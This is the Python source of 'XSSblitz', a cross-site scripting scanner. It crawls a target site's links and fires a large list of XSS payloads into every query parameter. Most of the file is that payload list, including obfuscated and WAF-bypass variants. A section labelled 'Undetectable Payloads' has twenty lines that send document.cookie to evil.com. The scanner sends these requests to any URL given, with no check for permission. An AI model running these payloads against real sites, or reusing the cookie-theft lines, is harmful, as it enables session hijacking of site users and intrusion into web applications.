import os
import sys
import time
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from colorama import Fore, Style, init
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.text import Text

# Initialize colorama and rich
init(autoreset=True)
console = Console()

# Branding
TOOL_NAME = "XSSblitz"
VERSION = "1.0"
AUTHOR = "Darkstarbdx"
GITHUB = "https://github.com/darkstarbdx/XSSblitz"

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    # Add more user agents here...
]

# Advanced Payloads
PAYLOADS = [
    # Basic Payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",

    # Obfuscated Payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
    "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>",

    # Bypass WAFs
    "<script>alert`XSS`</script>",
    "<img src=x oneonerror=alert('XSS')>",
    "<img src=x onerror=alert`XSS`>",
    "<img src=x onerror=alert('XSS')//",
    "<img src=x onerror=alert('XSS')%0A>",
    "<img src=x onerror=alert('XSS')%0D>",
    "<img src=x onerror=alert('XSS')%09>",
    "<img src=x onerror=alert('XSS')%00>",
    "<img src=x onerror=alert('XSS')%0B>",
    "<img src=x onerror=alert('XSS')%0C>",
    "<img src=x onerror=alert('XSS')%0D%0A>",
    "<img src=x onerror=alert('XSS')%0A%0D>",
    "<img src=x onerror=alert('XSS')%0D%0A%09>",
    "<img src=x onerror=alert('XSS')%0A%0D%09>",
    "<img src=x onerror=alert('XSS')%0D%0A%20>",
    "<img src=x onerror=alert('XSS')%0A%0D%20>",
    "<img src=x onerror=alert('XSS')%0D%0A%09%20>",
    "<img src=x onerror=alert('XSS')%0A%0D%09%20>",

    # DOM-based XSS Payloads
    "#<script>alert('XSS')</script>",
    "#javascript:alert('XSS')",
    "#<img src=x onerror=alert('XSS')>",
    "#<svg/onload=alert('XSS')>",
    "#<body onload=alert('XSS')>",
    "#<iframe src=javascript:alert('XSS')>",
    "#<a href=javascript:alert('XSS')>Click Me</a>",
    "#<div onmouseover=alert('XSS')>Hover Me</div>",
    "#<input type=text value='<script>alert(\"XSS\")</script>'>",
    "#<marquee onstart=alert('XSS')>Scroll Me</marquee>",
    "#<video><source onerror=alert('XSS')>",
    "#<audio src=x onerror=alert('XSS')>",
    "#<details/open/ontoggle=alert('XSS')>",
    "#<select onfocus=alert('XSS')><option>Select Me</option></select>",
    "#<form onsubmit=alert('XSS')><input type=submit></form>",
    "#<keygen autofocus onfocus=alert('XSS')>",
    "#<textarea onfocus=alert('XSS')>Click Me</textarea>",
    "#<button onfocus=alert('XSS') autofocus>Click Me</button>",
    "#<isindex type=image src=1 onerror=alert('XSS')>",
    "#<object data=javascript:alert('XSS')>",
    "#<embed src=javascript:alert('XSS')>",

    # Advanced Payloads
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(document.cookie)>",
    "<body onload=alert(document.cookie)>",
    "<iframe src=javascript:alert(document.cookie)>",
    "<a href=javascript:alert(document.cookie)>Click Me</a>",
    "<div onmouseover=alert(document.cookie)>Hover Me</div>",
    "<input type=text value='<script>alert(document.cookie)</script>'>",
    "<marquee onstart=alert(document.cookie)>Scroll Me</marquee>",
    "<video><source onerror=alert(document.cookie)>",
    "<audio src=x onerror=alert(document.cookie)>",
    "<details/open/ontoggle=alert(document.cookie)>",
    "<select onfocus=alert(document.cookie)><option>Select Me</option></select>",
    "<form onsubmit=alert(document.cookie)><input type=submit></form>",
    "<keygen autofocus onfocus=alert(document.cookie)>",
    "<textarea onfocus=alert(document.cookie)>Click Me</textarea>",
    "<button onfocus=alert(document.cookie) autofocus>Click Me</button>",
    "<isindex type=image src=1 onerror=alert(document.cookie)>",
    "<object data=javascript:alert(document.cookie)>",
    "<embed src=javascript:alert(document.cookie)>",

    # Undetectable Payloads
    "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
    "<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<svg/onload=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<body onload=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<iframe src=javascript:fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<a href=javascript:fetch('https://evil.com/steal?cookie='+document.cookie)>Click Me</a>",
    "<div onmouseover=fetch('https://evil.com/steal?cookie='+document.cookie)>Hover Me</div>",
    "<input type=text value='<script>fetch(\"https://evil.com/steal?cookie=\"+document.cookie)</script>'>",
    "<marquee onstart=fetch('https://evil.com/steal?cookie='+document.cookie)>Scroll Me</marquee>",
    "<video><source onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<audio src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<details/open/ontoggle=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<select onfocus=fetch('https://evil.com/steal?cookie='+document.cookie)><option>Select Me</option></select>",
    "<form onsubmit=fetch('https://evil.com/steal?cookie='+document.cookie)><input type=submit></form>",
    "<keygen autofocus onfocus=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<textarea onfocus=fetch('https://evil.com/steal?cookie='+document.cookie)>Click Me</textarea>",
    "<button onfocus=fetch('https://evil.com/steal?cookie='+document.cookie) autofocus>Click Me</button>",
    "<isindex type=image src=1 onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<object data=javascript:fetch('https://evil.com/steal?cookie='+document.cookie)>",
    "<embed src=javascript:fetch('https://evil.com/steal?cookie='+document.cookie)>",
]

# Clear terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Print header with branding
def print_header():
    clear_screen()
    console.print(Panel.fit(f"🔍 {TOOL_NAME} 🕵️‍♂️ - XSS Vulnerability Scanner", style="bold cyan"))
    console.print(Panel.fit(f"📌 Version: {VERSION}\n👤 Author: {AUTHOR}\n🌐 GitHub: {GITHUB}", style="bold yellow"))
    console.print("A powerful tool to scan for XSS vulnerabilities in web applications.\n")

# Print help menu with branding
def print_help():
    print_header()
    console.print(Panel.fit("📖 Help Menu", style="bold magenta"))

    # Options Table
    table = Table(show_header=True, header_style="bold cyan", border_style="yellow")
    table.add_column("⚙️ Option", style="bold green")
    table.add_column("📝 Description", style="bold blue")
    table.add_column("💡 Example", style="bold yellow")

    table.add_row(
        "-u, --url",
        "Target URL to scan",
        f"python {TOOL_NAME}.py -u https://example.com"
    )
    table.add_row(
        "-t, --threads",
        "Number of threads to use (default: 10)",
        f"python {TOOL_NAME}.py -t 20"
    )
    table.add_row(
        "-o, --output",
        "Save results to a file",
        f"python {TOOL_NAME}.py -o results.txt"
    )
    table.add_row(
        "-h, --help",
        "Show this help menu",
        f"python {TOOL_NAME}.py -h"
    )

    console.print(table)

    # Example Usage Panel
    console.print(Panel.fit(f"💡 Example Usage:\npython {TOOL_NAME}.py -u https://example.com -t 20 -o results.txt", style="bold green"))

    # Footer
    console.print(Panel.fit(f"🚀 Happy Hacking with {TOOL_NAME} 🕵️‍♂️! 🚀", style="bold cyan"))

# Fetch all links from a given URL that belong to the same domain
def fetch_links(url):
    try:
        response = requests.get(url, headers={"User-Agent": USER_AGENTS[0]})
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        domain = urlparse(url).netloc  # Extract the main domain
        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if urlparse(full_url).netloc == domain:  # Filter URLs belonging to the same domain
                links.add(full_url)
        return links
    except Exception as e:
        console.print(f"[bold red]Error fetching links from {url}: {e}[/bold red]")
        return set()

# Test XSS vulnerability
def test_xss(url):
    try:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if not query_params:
            return False, None, None  # Skip URLs without query parameters

        for param in query_params:
            for payload in PAYLOADS:
                modified_params = query_params.copy()
                modified_params[param] = [payload]
                modified_query = urlencode(modified_params, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=modified_query))

                response = requests.get(test_url, headers={"User-Agent": USER_AGENTS[0]})
                if payload in response.text:
                    return True, test_url, payload
        return False, None, None
    except Exception as e:
        console.print(f"[bold red]Error testing XSS on {url}: {e}[/bold red]")
        return False, None, None

# Save results to a text file
def save_results(results, output_file):
    with open(output_file, "w") as file:
        file.write(f"{TOOL_NAME} - XSS Vulnerability Scan Results\n")
        file.write("============================================\n")
        for result in results:
            file.write(f"Vulnerable URL: {result['url']} | Payload: {result['payload']}\n")

# Display results in a table
def display_results(results):
    console.print(Panel.fit(f"📌 {TOOL_NAME} - Vulnerable URLs", style="bold cyan"))
    table = Table(show_header=True, header_style="bold magenta", border_style="yellow")
    table.add_column("🔗 URL", style="bold green")
    table.add_column("💣 Payload", style="bold red")

    for result in results:
        table.add_row(result["url"], result["payload"])

    console.print(table)

# Main function
def main(target_url, threads=10, output_file="xss_results.txt"):
    print_header()
    console.print(Panel.fit("🔍 Collecting links...", style="bold green"))
    links = fetch_links(target_url)
    console.print(Panel.fit(f"📂 Found {len(links)} links.", style="bold green"))
    
    console.print(Panel.fit("🚀 Testing for XSS vulnerabilities...", style="bold green"))
    results = []
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        task = progress.add_task("[cyan]Testing URLs...", total=len(links))
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(test_xss, link) for link in links]
            for future in futures:
                is_vulnerable, url, payload = future.result()
                if is_vulnerable:
                    results.append({"url": url, "payload": payload})
                progress.update(task, advance=1)
    
    console.print(Panel.fit("📝 Saving results...", style="bold green"))
    save_results(results, output_file)
    
    console.print(Panel.fit("🎉 Scan completed!", style="bold green"))
    display_results(results)

# Entry point
if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        print_help()
    elif "-u" in sys.argv or "--url" in sys.argv:
        target_url = sys.argv[sys.argv.index("-u") + 1] if "-u" in sys.argv else sys.argv[sys.argv.index("--url") + 1]
        threads = int(sys.argv[sys.argv.index("-t") + 1]) if "-t" in sys.argv else 10
        output_file = sys.argv[sys.argv.index("-o") + 1] if "-o" in sys.argv else "xss_results.txt"
        main(target_url, threads, output_file)
    else:
        console.print(Panel.fit("[bold red]Error: No target URL provided. Use -h for help.[/bold red]", style="bold red"))